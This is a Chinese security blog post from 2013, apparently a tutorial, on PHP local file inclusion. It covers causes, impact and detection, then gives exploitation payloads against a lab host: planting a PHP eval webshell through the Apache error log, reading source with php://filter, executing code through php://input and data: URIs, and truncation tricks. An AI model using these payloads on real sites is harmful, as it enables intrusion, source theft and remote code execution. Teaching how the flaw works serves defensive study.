<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 文件包含科普 · AsuraQin</title><meta name="description" content="文件包含科普 - qinyening"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="http://fonts.useso.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/710x710" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/710leo" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">文件包含科普</h1><div class="post-info">Nov 8, 2013</div><div class="post-content"><p></p><h4>1.形成原因</h4><br>使用动态文件包含且变量没有过滤<p></p>
<p></p><h4>2.造成影响</h4><br>2.1暴露重要文件<br>2.2获取网站权限<br><a id="more"></a> <p></p>
<p></p><h4>3.漏洞挖掘</h4><br>3.1 黑盒测试用WVS等扫描器扫描<br>3.2 白盒测试在代码中寻找include()、include_once()、require()、require_once()这几个函数以及和这几个函数相关的变量<p></p>
<p></p><h4>4.利用技巧(测试环境 apache2.2 php5.3)</h4><br>4.1 查看重要文件../etc/passwd实例见<br><a href="http://www.wooyun.org/bugs/wooyun-2013-028410" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2013-028410</a> <p></p>
<p>4.2 Apache错误日志写入一句话首先找到错误日志的位置<br>VulDrill/../logs/apache_error.log然后构造错误访问<a href="http://192.168.199.170/VulDrill/fi.php?f=" target="_blank" rel="external">http://192.168.199.170/VulDrill/fi.php?f=</a>&lt;?php @eval($_POST[‘zero’]);?&gt; 最后在VulDrill/../logs/apache_error.log链接webshell即可</p>
<p>4.3 利用 php://filter<br>读取php文件<br><a href="http://192.168.199.170/VulDrill/fi.php?f=php://filter/read=convert.base64-encode/resource=database.php" target="_blank" rel="external">http://192.168.199.170/VulDrill/fi.php?f=php://filter/read=convert.base64-encode/resource=database.php</a><br><img src="http://x2knowblog.qiniudn.com/aa.jpg" alt="图片"><br>得到base64编码后一段内容，base64解码即可<br><img src="http://x2knowblog.qiniudn.com/aaa.jpg" alt="图片">    </p>
<p>4.4 利用 php://input 执行代码<br>php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。 <img src="http://x2knowblog.qiniudn.com/blogQQ%E6%88%AA%E5%9B%BE20140212203325.jpg" alt=""></p>
<p>4.5 利用data:URI schema执行代码<br><a href="http://192.168.199.170/VulDrill/fi.php?f=data:text/plain" target="_blank" rel="external">http://192.168.199.170/VulDrill/fi.php?f=data:text/plain</a>,&lt;?php%20system(‘cd’)?&gt;<br><a href="http://192.168.199.170/VulDrill/fi.php?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjZCcpPz4=" target="_blank" rel="external">http://192.168.199.170/VulDrill/fi.php?f=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjZCcpPz4=</a>    </p>
<p>4.6 当代码是后面这种形式时：&lt;?php include($a.“.php”); ?&gt; 需要用到截断技术<br>4.6.1 %00截断，这种有gpc=off和php版本限制<br>4.6.2 .或者./或者\或者/截断（多次重复)<br>乌云实例 <a href="http://www.wooyun.org/bugs/wooyun-2010-08824" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-08824</a></p>
<p>4.7其他利用方法<br>远程文件包含 <a href="http://developer.51cto.com/art/201104/255224.htm" target="_blank" rel="external">http://developer.51cto.com/art/201104/255224.htm</a><br>Linux包含/proc/self/environ环境变量     <a href="http://www.myhack58.com/Article/html/3/62/2011/32008.htm" target="_blank" rel="external">http://www.myhack58.com/Article/html/3/62/2011/32008.htm</a>    </p>
<p>####参考<br><a href="http://zone.wooyun.org/content/2196" target="_blank" rel="external">http://zone.wooyun.org/content/2196</a><br><a href="http://danqingdani.blog.163.com/blog/static/1860941952013993810261/" target="_blank" rel="external">http://danqingdani.blog.163.com/blog/static/1860941952013993810261/</a><br><a href="http://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="external">http://www.php.net/manual/zh/wrappers.php.php</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/2013/12/09/wen-jian-bian-li/" class="prev">上一篇</a><a href="/2013/10/13/kai-fa-zi-xun-fa-bu-xi-tong-you-gan/" class="next">下一篇</a></div><div class="copyright"><p>© 2015 - 2016 <a href="http://blog.x2know.org">qinyening</a>, unless otherwise noted.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>